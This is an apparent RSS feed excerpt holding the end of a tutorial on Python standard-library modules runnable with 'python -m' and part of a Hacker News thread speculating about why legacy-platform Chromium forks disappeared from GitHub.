       <span>46</span>    <span>0</span>.004    <span>0</span>.000    <span>0</span>.004    <span>0</span>.000 <span>{</span>built-in method marshal.loads<span>}</span>
  <span>213</span>/211    <span>0</span>.003    <span>0</span>.000    <span>0</span>.005    <span>0</span>.000 <span>{</span>built-in method builtins.__build_class__<span>}</span>
       <span>16</span>    <span>0</span>.002    <span>0</span>.000    <span>0</span>.002    <span>0</span>.000 <span>{</span>built-in method _imp.create_dynamic<span>}</span>

... <span>[</span>Over <span>750</span> more lines of output<span>]</span>
</code></pre></div>
<p>The <code>pstat</code> command can process and compute statistics on the output of a profile file that's generated by <code>cProfile</code>.</p>
<p>The <code>profile</code> script is equivalent to the <code>cProfile</code> script, but it's written entirely in Python and is slower, so <code>cProfile</code> is preferable over <code>profile</code>.</p>
<h3 id="pickle"><code>pickle</code> &amp; <code>pickletools</code></h3>
<p>Have a pickle file and want to see what's in it?</p>
<p>Running the <code>pickle</code> module as a script will show the unpickled data:</p>
<div><pre><span></span><code>$ python -m pickle data.pickle
<span>{</span><span>'color'</span>: <span>'purple'</span>, <span>'name'</span>: <span>'duck'</span><span>}</span>
</code></pre></div>
<p>Running the <code>pickletools</code> module as a script will show a detailed explanation of each piece of the pickled data:</p>
<div><pre><span></span><code>$ python -m pickletools data.pickle
    <span>0</span>: <span>\x</span><span>80</span> PROTO      <span>4</span>
    <span>2</span>: <span>\x</span><span>95</span> FRAME      <span>36</span>
   <span>11</span>: <span>}</span>    EMPTY_DICT
   <span>12</span>: <span>\x</span><span>94</span> MEMOIZE    <span>(</span>as <span>0</span><span>)</span>
   <span>13</span>: <span>(</span>    MARK
   <span>14</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'name'</span>
   <span>20</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>1</span><span>)</span>
   <span>21</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'duck'</span>
   <span>27</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>2</span><span>)</span>
   <span>28</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'color'</span>
   <span>35</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>3</span><span>)</span>
   <span>36</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'purple'</span>
   <span>44</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>4</span><span>)</span>
   <span>45</span>: u      SETITEMS   <span>(</span>MARK at <span>13</span><span>)</span>
   <span>46</span>: .    STOP
highest protocol among <span>opcodes</span> <span>=</span> <span>4</span>
</code></pre></div>

<p>Here are <em>even more</em> Python-related tools which are oddly meta.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m code</code></td>
<td>Run a Python REPL</td>
</tr>
<tr>
<td><code>python -m runpy</code></td>
<td>Run a Python module as a script</td>
</tr>
</tbody>
</table>
<h3 id="code"><code>code</code></h3>
<p>The <code>code</code> module is used for making interactive Python interpreters, so running it will basically run a version of the interactive Python REPL:</p>
<div><pre><span></span><code>$ python -m code
Python <span>3</span>.12.0 <span>(</span>main, Nov <span>30</span> <span>2023</span>, <span>17</span>:49:51<span>)</span> <span>[</span>GCC <span>11</span>.4.0<span>]</span> on linux
Type <span>"help"</span>, <span>"copyright"</span>, <span>"credits"</span> or <span>"license"</span> <span>for</span> more information.
<span>(</span>InteractiveConsole<span>)</span>
&gt;&gt;&gt;
</code></pre></div>
<h3 id="runpy"><code>runpy</code></h3>
<p>The <code>runpy</code> module is used for dynamically running a given Python module by its name.
The fact that it has a command-line interface is a bit odd, since it essentially does what Python already does for us!</p>
<p>Here's <code>runpy</code> running <code>runpy</code> running <code>runpy</code> running the <code>unittest</code> module:</p>
<div><pre><span></span><code>$ python -m runpy runpy runpy unittest

----------------------------------------------------------------------
Ran <span>0</span> tests <span>in</span> <span>0</span>.000s

NO TESTS RAN
</code></pre></div>

<p>The remaining tools are ones that are unlikely to be useful often.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m timeit</code></td>
<td>Time a Python expression</td>
</tr>
<tr>
<td><code>python -m site</code></td>
<td>See "site" information about Python</td>
</tr>
<tr>
<td><code>python -m sysconfig</code></td>
<td>Show Python configuration details</td>
</tr>
<tr>
<td><code>python -m platform</code></td>
<td>Display current platform information</td>
</tr>
<tr>
<td><code>python -m mimetypes</code></td>
<td>Show file mimetype/extension details</td>
</tr>
<tr>
<td><code>python -m quopri</code></td>
<td>Encode/decode raw email data</td>
</tr>
<tr>
<td><code>python -m filecmp</code></td>
<td>Compare contents of 2 directories</td>
</tr>
<tr>
<td><code>python -m encodings.rot_13</code></td>
<td>ROT-13 encode/decode text</td>
</tr>
<tr>
<td><code>python -m tabnanny</code></td>
<td>Check Python file for mixed tabs &amp; spaces</td>
</tr>
</tbody>
</table>
<h3 id="timeit"><code>timeit</code></h3>
<p>If you need time how long a single Python expression takes to run, you could use <code>timeit</code> as a script:</p>
<div><pre><span></span><code>$ python -m timeit <span>'sum([list(range(1000))] * 50, [])'</span>
<span>100</span> loops, best of <span>5</span>: <span>2</span>.2 msec per loop
$ python -m timeit <span>'import itertools; itertools.chain.from_iterable([list(range(1000))] * 50)'</span>
<span>20000</span> loops, best of <span>5</span>: <span>10</span>.5 usec per loop
</code></pre></div>
<p>You may find it surprising that I include <code>timeit</code> in the list of rarely useful tools.
I actually find the <code>timeit</code> module <em>very useful</em>, but I find that I pretty much always need to use it as a module rather than a script.
<a href="https://docs.python.org/3/library/timeit.html#basic-examples" target="_blank">More on using <code>timeit</code> in the documentation</a>.</p>
<h3 id="site"><code>site</code></h3>
<p>Running the <code>site</code> module as a script will show a bit of information about your current Python environment, including <code>sys.path</code> (which shows the directories in your <code>PYTHONPATH</code>).</p>
<div><pre><span></span><code>$ python -m site
sys.path <span>=</span> <span>[</span>
    <span>'/home/trey/repos/business/screencasts'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python312.zip'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12/lib-dynload'</span>,
    <span>'/home/trey/.local/lib/python3.12/site-packages'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages'</span>,
<span>]</span>
USER_BASE: <span>'/home/trey/.local'</span> <span>(</span>exists<span>)</span>
USER_SITE: <span>'/home/trey/.local/lib/python3.12/site-packages'</span> <span>(</span>exists<span>)</span>
ENABLE_USER_SITE: True
</code></pre></div>
<p>The <code>--user-base</code> or <code>--user-site</code> arguments can be passed to the <code>site</code> script to see just the location of those two directories:</p>
<div><pre><span></span><code>$ python -m site --user-base
/home/trey/.local
$ python -m site --user-site
/home/trey/.local/lib/python3.12/site-packages
</code></pre></div>
<h3 id="sysconfig"><code>sysconfig</code></h3>
<p>Running the <code>sysconfig</code> module as a script will show a <em>huge</em> amount of information about your Python installation.</p>
<div><pre><span></span><code>$ python3.12 -m sysconfig <span>|</span> less
Platform: <span>"linux-x86_64"</span>
Python version: <span>"3.12"</span>
Current installation scheme: <span>"posix_prefix"</span>

Paths:
        <span>data</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0"</span>
        <span>include</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/include/python3.12"</span>
        <span>platinclude</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/include/python3.12"</span>
        <span>platlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages"</span>
        <span>platstdlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12"</span>
        <span>purelib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages"</span>
        <span>scripts</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/bin"</span>
        <span>stdlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12"</span>

Variables:
        <span>ABIFLAGS</span> <span>=</span> <span>""</span>
        <span>AC_APPLE_UNIVERSAL_BUILD</span> <span>=</span> <span>"0"</span>

... <span>[</span>Over <span>1000</span> more lines of output<span>]</span>
</code></pre></div>
<h3 id="platform"><code>platform</code></h3>
<p>The <code>platform</code> script will tell you information about your operating system kernel:</p>
<div><pre><span></span><code>$ python -m platform
Linux-6.5.0-1023-oem-x86_64-with-glibc2.35
</code></pre></div>
<h3 id="mimetypes"><code>mimetypes</code></h3>
<p>You can use <code>mimetypes</code> to find the file extension for a given file type:</p>
<div><pre><span></span><code>$ python -m mimetypes -e <span>'text/markdown'</span>
.md
</code></pre></div>
<p>Or you can use <code>mimetypes</code> to discover the type of a given file:</p>
<div><pre><span></span><code>$ python -m mimetypes README.md
type: text/markdown encoding: None
</code></pre></div>
<h3 id="quopri"><code>quopri</code></h3>
<p>The <code>quopri</code> command encode/decode quoted-printable data for raw email data:</p>
<div><pre><span></span><code>$ <span>echo</span> <span>'Hi! 👋'</span> <span>|</span> python -m quopri
Hi! <span>=</span><span>F0</span><span>=</span><span>9F</span><span>=</span><span>91</span><span>=</span>8B
</code></pre></div>
<h3 id="filecmp"><code>filecmp</code></h3>
<p>The <code>filecmp</code> script accepts two directories and notes which files are different or the same between them.
It has a very primitive command-line interface.</p>
<div><pre><span></span><code>$ python -m filecmp dir1 dir2
diff dir1 dir2
Only <span>in</span> dir1 : <span>[</span><span>'c'</span>, <span>'sub2'</span><span>]</span>
Only <span>in</span> dir2 : <span>[</span><span>'d'</span>, <span>'sub3'</span><span>]</span>
Identical files : <span>[</span><span>'a'</span><span>]</span>
Differing files : <span>[</span><span>'b'</span><span>]</span>
Common subdirectories : <span>[</span><span>'sub1'</span><span>]</span>
</code></pre></div>
<p>It's similar to the command-line <code>diff</code> utility but it only works on directories and its output is less readable.</p>
<h3 id="rot13"><code>encodings.rot_13</code></h3>
<p>Need to ROT-13 encode/decode some text?
Probably not.
But Python has a command-line tool for that.</p>
<div><pre><span></span><code>$ <span>echo</span> <span>'Hello!'</span> <span>|</span> python -m encodings.rot_13
Uryyb!
$ <span>echo</span> <span>'Uryyb!'</span> <span>|</span> python -m encodings.rot_13
Hello!
</code></pre></div>
<h3 id="tabnanny"><code>tabnanny</code></h3>
<p>Need to check whether a Python file mixes tabs and spaces?
Hopefully not!</p>
<div><pre><span></span><code>$ python -m tabnanny example.py
example.py <span>3</span> <span>"\tprint('Hi')"</span>
</code></pre></div>
<p>This used to be legal syntax in Python 2, but in Python 3 it's not valid anymore, so a <code>SyntaxError</code> will usually tell you something is wrong without needing to deliberately check.</p>
<h2 id="cheat-sheet">Every command-line tool in Python</h2>
<p>Here's a quick summary of every command-line tool in Python:</p>
<table>
<thead>
<tr>
<th>Module/Script</th>
<th>Purpose</th>
<th>Category</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#httpserver" target="_blank"><code>http.server</code></a></td>
<td>Start a simple web server</td>
<td>General</td>
</tr>
<tr>
<td><a href="#webbrowser" target="_blank"><code>webbrowser</code></a></td>
<td>Launch your web browser</td>
<td>General</td>
</tr>
<tr>
<td><a href="#jsontool" target="_blank"><code>json.tool</code></a></td>
<td>Nicely format JSON data</td>
<td>General</td>
</tr>
<tr>
<td><a href="#calendar" target="_blank"><code>calendar</code></a></td>
<td>Show a command-line calendar</td>
<td>General</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>uuid</code></a></td>
<td>Like <code>uuidgen</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>sqlite3</code></a></td>
<td>Like <code>sqlite3</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>zipfile</code></a></td>
<td>Like <code>zip</code> &amp; <code>unzip</code> CLI utilities</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>gzip</code></a></td>
<td>Like <code>gzip</code> &amp; <code>gunzip</code> CLI utilities</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>tarfile</code></a></td>
<td>Like the <code>tar</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>base64</code></a></td>
<td>Like the <code>base64</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>ftplib</code></a></td>
<td>Like the <code>ftp</code> utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>smtplib</code></a></td>
<td>Like the <code>sendmail</code> utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>poplib</code></a></td>
<td>Like using <code>curl</code> to read email</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>imaplib</code></a></td>
<td>Like using <code>curl</code> to read email</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>telnetlib</code></a></td>
<td>Like the <code>telnet</code>utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#pip" target="_blank"><code>pip</code></a></td>
<td>Install third-party Python packages</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#venv" target="_blank"><code>venv</code></a></td>
<td>Create a virtual environment</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#pdb" target="_blank"><code>pdb</code></a></td>
<td>Run the Python Debugger</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#unittest" target="_blank"><code>unittest</code></a></td>
<td>Run <code>unittest</code> tests in a directory</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#pydoc" target="_blank"><code>pydoc</code></a></td>
<td>Show documentation for given string</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#doctest" target="_blank"><code>doctest</code></a></td>
<td>Run doctests for a given Python file</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#ensurepip" target="_blank"><code>ensurepip</code></a></td>
<td>Install <code>pip</code> if it's not installed</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#idlelib" target="_blank"><code>idlelib</code></a></td>
<td>Launch Python's IDLE graphical REPL</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#zipapp" target="_blank"><code>zipapp</code></a></td>
<td>Turn Python module into runnable ZIP</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#tokenize" target="_blank"><code>tokenize</code></a></td>
<td>Break Python module into "tokens"</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#ast" target="_blank"><code>ast</code></a></td>
<td>Show abstract syntax tree for code</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#dis" target="_blank"><code>dis</code></a></td>
<td>Disassemble Python code to bytecode</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#inspect" target="_blank"><code>inspect</code></a></td>
<td>inspect source code of a Python object</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#pyclbr" target="_blank"><code>pyclbr</code></a></td>
<td>See overview of a module's objects</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#asyncio" target="_blank"><code>asyncio</code></a></td>
<td>Launch an asyncio-aware REPL</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#profile" target="_blank"><code>cProfile</code></a></td>
<td>Profile a Python program</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#profile" target="_blank"><code>profile</code></a></td>
<td>Profile Python program with Python</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#profile" target="_blank"><code>pstats</code></a></td>
<td>Show stats on cProfile-generated file</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#pickle" target="_blank"><code>pickle</code></a></td>
<td>Readably display pickle file contents</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#pickle" target="_blank"><code>pickletools</code></a></td>
<td>Disassemble a pickle file</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#tabnanny" target="_blank"><code>tabnanny</code></a></td>
<td>Check file for mixed tabs &amp; spaces</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#this" target="_blank"><code>this</code></a></td>
<td>Display the Zen of Python (PEP 20)</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#__hello__" target="_blank"><code>__hello__</code></a></td>
<td>Print <code>Hello world!</code></td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#antigravity" target="_blank"><code>antigravity</code></a></td>
<td>Open XKCD 353 in a web browser</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#turtledemo" target="_blank"><code>turtledemo</code></a></td>
<td>See <code>turtle</code> module demos</td>
<td>Fun</td>
</tr>
<tr>
<td><a href="#code" target="_blank"><code>code</code></a></td>
<td>Run a Python REPL</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#runpy" target="_blank"><code>runpy</code></a></td>
<td>Run a Python module as a script</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#timeit" target="_blank"><code>timeit</code></a></td>
<td>Time a Python expression</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#site" target="_blank"><code>site</code></a></td>
<td>See "site" information about Python</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#sysconfig" target="_blank"><code>sysconfig</code></a></td>
<td>Show Python configuration details</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#platform" target="_blank"><code>platform</code></a></td>
<td>Display current platform information</td>
<td>General</td>
</tr>
<tr>
<td><a href="#mimetypes" target="_blank"><code>mimetypes</code></a></td>
<td>Show file mimetype/extension details</td>
<td>General</td>
</tr>
<tr>
<td><a href="#quopri" target="_blank"><code>quopri</code></a></td>
<td>Encode/decode raw email data</td>
<td>General</td>
</tr>
<tr>
<td><a href="#filecmp" target="_blank"><code>filecmp</code></a></td>
<td>Compare contents of 2 directories</td>
<td>General</td>
</tr>
<tr>
<td><a href="#rot13" target="_blank"><code>encodings.rot_13</code></a></td>
<td>ROT-13 encode/decode text</td>
<td>General</td>
</tr>
</tbody>
</table>
<p>I discovered the command-line interface for many of these modules by using <a href="https://pym.dev/p/2eyt4/" target="_blank">this script</a>, which looks for command-line interfaces among all Python standard library modules.</p>
<p>Note that older versions included even more modules that could be run as scripts.
The standard library also included scripts for a <code>uu</code> module before Python 3.12 and <code>formatter</code>, <code>binhex</code>, <code>test.pystone</code>, and <code>hotshot.stones</code> existed in Python 2.</p>
<p>These are just the Python scripts included in the Python standard library.
Any third-party module that can be run as a script can also be launched via <code>python -m MODULE_NAME</code> as well.</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Tell HN: Chromium forks for legacy platforms are disappearing from GitHub (101 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=40567326</link>
            <guid>40567326</guid>
            <pubDate>Mon, 03 Jun 2024 20:43:55 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=40567326">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
            <tbody><tr id="40568138"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40568138" href="https://news.ycombinator.com/vote?id=40568138&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Even though all of this should be perfectly legal and follows TOS, GitHub really isn’t the place to host anything possibly damaging to or annoying big tech.</p><p>You can add push URLs to your origin branch such that `git push` automatically mirrors your code on multiple remotes: `git remote set-url --add --push origin git://another/repo.git`. If you maintain an open source repository, I would encourage you to have mirrors across gitlab, codeberg, and/or a self hosted gitea instance.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40568282"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40568282" href="https://news.ycombinator.com/vote?id=40568282&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>I'm certainly not against mirrors. But—</p><p>&gt; GitHub really isn’t the place to host anything possibly damaging to or annoying big tech.</p><p>Why would Google give a crap if a handful of people futzing around with ancient versions of Windows and macOS want to run up-to-date Chromium browsers?</p><p>If you wanted to be super conspiratorial, you could point to Supermium's statement[1] that they plan to retain Manifest V2 support. But that merely puts them in the same category as Brave and Firefox.</p><p>At the same time, I don't know how else to explain what is going on!</p><p>---</p><p>1: <a href="https://win32subsystem.live/supermium/#:~:text=Manifest%20V2%20is%20NOT%20slated%20for%20removal%20from%20Supermium%20browser" rel="nofollow">https://win32subsystem.live/supermium/#:~:text=Manifest%20V2...</a>.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569497"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40569497" href="https://news.ycombinator.com/vote?id=40569497&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Im keen to believe this is a genuine mistake on either GitHub or Google’s end. Perhaps some automated system they’re testing out.</p>
              </div></td></tr>
        </tbody></table></td></tr>
            <tr id="40568775"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40568775" href="https://news.ycombinator.com/vote?id=40568775&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Conspiracy hat: Google is fighting ad blockers via the new v3 manifest to keep the YouTube milk cow going. They will soon be rejecting v2 plugins and probably expect some flight to chromium.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40568847"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_40568847" href="https://news.ycombinator.com/vote?id=40568847&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Maybe take the hat off for a minute and consider how they'd possibly retroactively revoke the (non-revokable) open source licenses that all Chromium versions published to date have been licensed under.</p><p>Then ask yourself what the benefit of all that – already impossible – endeavor would be, given that Firefox also exists and isn't deprecating Manifest V2.</p><p>Finally, ask yourself which actual paths Google could take to still eventually force MFv3 on most web users without resorting to any such drastic and publicly-visible measures.</p><p>See? You didn't really need the hat!</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570827"><td><table>  <tbody><tr>    <td indent="4"><img src="https://news.ycombinator.com/s.gif" height="1" width="160"></td><td>
      <center><a id="up_40570827" href="https://news.ycombinator.com/vote?id=40570827&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>they don’t have to revoke the license, they just add this for new versions</p><p>&gt; what the benefit of all that endeavor would be</p><p>Breaking all adblockers for good, ensuring revenue. Firefox has almost no marketshare so it’s more or less irrelevant.</p><p>&gt; which actual paths Google could take to still eventually force MFv3</p><p>Next steps are to break the web more and more for non-chromium browsers. Already many sites that don’t work well with FF/Safari. 
There will be reasonable reasons to do that (eg protect the kids) but the end result will be 1 browser dominance and ads tattooed into your eyeballs - mark my words!!1</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40573301"><td><table>  <tbody><tr>    <td indent="5"><img src="https://news.ycombinator.com/s.gif" height="1" width="200"></td><td>
      <center><a id="up_40573301" href="https://news.ycombinator.com/vote?id=40573301&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>&gt; Next steps are to break the web more and more for non-chromium browsers</p><p>What stops people from switching to Brave, or some light fork that's basically "Chromium + Manifest V2"?</p><p>Google would need something akin to Web Attestation. And yes they <i>did</i> try that—so if you're going to put your conspiracy hat on I'd direct your attention there.</p></div></td></tr>
        </tbody></table></td></tr>
                                          <tr id="40567374"><td></td></tr>
                <tr id="40567775"><td></td></tr>
                <tr id="40568259"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40568259" href="https://news.ycombinator.com/vote?id=40568259&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>How would Google push DRM by filing false [1] copyright claims against various Chromium forks, which presumably wouldn't even contain any hypothetical DRM keys?</p><p>Regular old Chrome does in fact include a Widevine DRM binary blob, but Chromium doesn't contain the source for it.</p><p>If Google really wanted to push something like browser attestation (like they potentially did with their Web Environment Integrity proposal), almost by definition that part couldn't be open sourced either and would not be part of Chromium.</p><p>[1] Chromium is licensed under various open source licenses that Google can't retroactively revoke. Even for code that they own the full copyright on, they can at most release future versions under a closed license; for GPL-ed dependencies, that wouldn't work at all (not sure if Chromium has any).</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570717"><td></td></tr>
                              <tr id="40569339"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40569339" href="https://news.ycombinator.com/vote?id=40569339&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>In the thread you posted:</p><p>"Bluebox doesn't know why his Github account disappeared, but it was not intentional and he has contacted Github support!"</p><p>"the Supermium GitHub repository is currently unavailable. Efforts are being made to restore the repository"</p><p>If this is true, it could be because of using Google API Keys in the software.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569766"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40569766" href="https://news.ycombinator.com/vote?id=40569766&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>API keys are a good theory but as far as I can tell, at least in Chromium Legacy they're set up correctly per Google's policies. You can sign into a Google Account in the released builds of Chromium (so they are embedded in the binary) but when I compile the source myself the keys aren't there, so they haven't been disclosed in the source.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="40569321"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40569321" href="https://news.ycombinator.com/vote?id=40569321&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>I'm not sure if GitHub is the right place for chromium mirrors. When you upload to GitHub, you are agreeing that the code is licensed to GitHub under certain conditions (in addition to the license specified in the repository).</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569390"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40569390" href="https://news.ycombinator.com/vote?id=40569390&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Although a potential issue generally, it's unrelated here.</p><p>If it's already open source, GitHub can almost (depending on license) use it as they see fit anyway.</p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="40567786"><td></td></tr>
                <tr id="40568210"><td></td></tr>
                            <tr id="40570268"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40570268" href="https://news.ycombinator.com/vote?id=40570268&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>Isn't GitHub owned by Microsoft?  Isn't Microsoft using GitHub to train AI? Doesn't Google also have AI ambitions?</p><p>I think it plausible that we are seeing the shadows cast by competitive maneuvering between two industry heavy-weights.</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="40567906"><td></td></tr>
                <tr id="40568224"><td></td></tr>
                <tr id="40568746"><td></td></tr>
                <tr id="40569796"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
      <center><a id="up_40569796" href="https://news.ycombinator.com/vote?id=40569796&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>The beauty of git (everyone has a full copy of the repo). Although this being an installable browser targeted more towards end users I wouldn’t trust a repo from anyone other than the official maintainers.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                              <tr id="40571585"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_40571585" href="https://news.ycombinator.com/vote?id=40571585&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>It's notable that Chromium is an especially large repo, and it seems has been special cased in githubs repo size limits.</p><p>It's possible this is GitHub just enforcing their size limit</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="40570763"><td></td></tr>
            <tr id="40567798"><td></td></tr>
                <tr id="40568196"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_40568196" href="https://news.ycombinator.com/vote?id=40568196&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div><p>How would it? Google can't retroactively un-license the Chromium source, which is under various open source licenses that I'm almost certain all include at a minimum the right to host a fork somewhere.</p><p>Additionally, if you are concerned about MF3, your best bet isn't some outdated Chromium fork – it's Firefox.</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="40569004"><td><table>  <tbody><tr>    <td indent="2"><img src="https://news.ycombinator.com/s.gif" height="1" width="80"></td><td>
      <center><a id="up_40569004" href="https://news.ycombinator.com/vote?id=40569004&amp;how=up&amp;goto=item%3Fid%3D40567326"></a></center>    </td><td><br><div>
                  <p>Just to be clear, Chromium Legacy and Supermium aren't outdated, that's what makes them great. They work on outdated operating systems, but they track up-to-date Chromium.</p>
              </div></td></tr>
        </tbody></table></td></tr>
                <tr id="40570119"><td><table>  <tbody><tr>    <td indent="3"><img src="https://news.ycombinator.com/s.gif" height="1" width="120"></td><td>
